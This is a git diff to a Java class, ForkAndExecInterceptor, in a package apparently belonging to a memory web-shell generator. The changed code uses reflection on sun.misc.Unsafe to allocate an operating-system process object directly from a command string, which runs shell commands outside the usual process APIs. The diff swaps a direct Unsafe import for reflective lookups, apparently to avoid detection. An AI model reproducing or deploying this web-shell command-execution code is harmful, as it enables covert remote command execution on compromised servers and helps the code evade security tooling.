@@ -1,7 +1,6 @@
 package com.reajason.javaweb.memshell.generator.command;
 
 import net.bytebuddy.asm.Advice;
-import sun.misc.Unsafe;
 
 import java.io.IOException;
 import java.io.InputStream;
@@ -17,9 +16,10 @@ public class ForkAndExecInterceptor {
     public static void enter(@Advice.Argument(value = 0) String cmd, @Advice.Return(readOnly = false) InputStream returnValue) throws IOException {
         try {
             String[] strs = cmd.split("\\s+");
-            Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
-            theUnsafeField.setAccessible(true);
-            Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
+            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
+            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Object unsafe = unsafeField.get(null);
 
             Class<?> processClass = null;
 
@@ -28,7 +28,7 @@ public class ForkAndExecInterceptor {
             } catch (ClassNotFoundException e) {
                 processClass = Class.forName("java.lang.ProcessImpl");
             }
-            Object processObject = unsafe.allocateInstance(processClass);
+            Object processObject = unsafeClass.getMethod("allocateInstance", Class.class).invoke(unsafe, processClass);
 
             byte[][] args = new byte[strs.length - 1][];
             int size = args.length;
